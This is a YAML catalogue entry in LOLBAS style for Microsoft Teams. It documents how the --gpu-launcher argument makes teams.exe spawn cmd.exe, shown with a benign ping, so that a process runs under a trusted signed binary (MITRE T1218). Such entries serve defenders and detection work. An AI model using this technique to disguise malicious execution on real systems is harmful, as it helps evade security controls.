---
Name: Teams.exe
Description: Microsoft Teams
Author: mr.d0x
Created: 2023-05-27
Commands:
  - Command: teams.exe --disable-gpu-sandbox --gpu-launcher="C:\Windows\system32\cmd.exe /c ping google.com &&"
    Description: Teams spawns cmd.exe as a child process of teams.exe and executes the ping command
    Usecase: Executes a process under a trusted Microsoft signed binary
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 10, Windows 11
Full_Path:
  - Path: c:\Users\username\AppData\Local\Microsoft\Teams\current\Teams.exe
Resources:
Acknowledgement:
  - Person: mr.d0x
    Handle: '@mrd0x'
---